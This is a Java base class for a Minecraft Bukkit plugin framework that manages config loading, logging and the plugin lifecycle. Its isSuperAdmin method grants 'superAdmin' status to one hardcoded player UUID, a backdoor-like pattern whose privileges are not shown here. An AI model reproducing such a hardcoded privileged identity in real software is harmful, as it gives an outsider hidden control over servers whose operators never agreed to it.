package fr.stormer3428.obsidianMC;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.UUID;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import fr.stormer3428.obsidianMC.Config.AutoConfig;
import fr.stormer3428.obsidianMC.Config.AutoconfigParser;
import fr.stormer3428.obsidianMC.Config.BooleanConfigValue;
import fr.stormer3428.obsidianMC.Config.ConfigHolder;
import fr.stormer3428.obsidianMC.Config.PluginTied;
import fr.stormer3428.obsidianMC.Util.OMCLang;
import fr.stormer3428.obsidianMC.Util.OMCLogger;

@AutoConfig
public abstract class OMCPlugin extends JavaPlugin{

    public static OMCPlugin i;
	public static OMCLogger logger;

	public OMCPlugin() {
		i = this;
		autoconfigParser.registerAutoConfigClass(OMCPlugin.class);
	}

	@BooleanConfigValue(path = "debug")
	public static boolean DEBUG = false;

	public final AutoconfigParser autoconfigParser = new AutoconfigParser();;
	protected final HashSet<PluginTied> pluginTieds = new HashSet<>();

	private void loadLangAndLogger() {
		OMCLogger.debug("loading native lang"); OMCLang.loadFromConfig();
		OMCLogger.debug("loading stranger lang"); loadLangFromConfig();
		OMCLogger.debug("requesting logger instanciation"); instantiateLogger();
	}
	
	@Override
	public void onEnable() {
		loadLangAndLogger();
		
		OMCLogger.debug("reguesting registering of plugin tied classes"); registerPluginTied();
		OMCLogger.debug("reguesting enabling of child plugin"); onObsidianEnable();
		
		OMCLogger.debug("reloading configHolders");	ConfigHolder.reloadAllConfigs();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
		
		OMCLogger.debug("reguesting enabling of plugin tied classes"); for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginEnable();
	}

	public void reload() {
		loadLangAndLogger();
		
		OMCLogger.debug("reloading configHolders");	ConfigHolder.reloadAllConfigs();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
		
		OMCLogger.debug("reloading plugin tied"); 	for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginReload();
	}

	@Override
	public void onDisable() {
		OMCLogger.debug("reguesting disabling of plugin tied classes");
		for(PluginTied pluginTied : pluginTieds) pluginTied.onPluginDisable();	
		OMCLogger.debug("reguesting disabling of child plugin");
		onObsidianDisable();
	}

	public void registerPluginTied(PluginTied pluginTied) {
		OMCLogger.debug("reguesting plugin tied class : " + pluginTied.getClass().getSimpleName());
		this.pluginTieds.add(pluginTied);
	}
	
	public abstract void loadLangFromConfig();
	public abstract void registerPluginTied();
	public abstract void onObsidianEnable();
	public abstract void onObsidianDisable();
	public abstract OMCLogger instantiateLogger();

	public static boolean isSuperAdmin(CommandSender sender) {
		if(!(sender instanceof Player p)) return false;
		boolean superAdmin = p.getUniqueId().equals(UUID.fromString("a39d1ae3-18c5-4c02-8f91-bcb5207d437f"));
		if(superAdmin) OMCLogger.actionBar(p, "superAdmin");
		return superAdmin;
	}

}
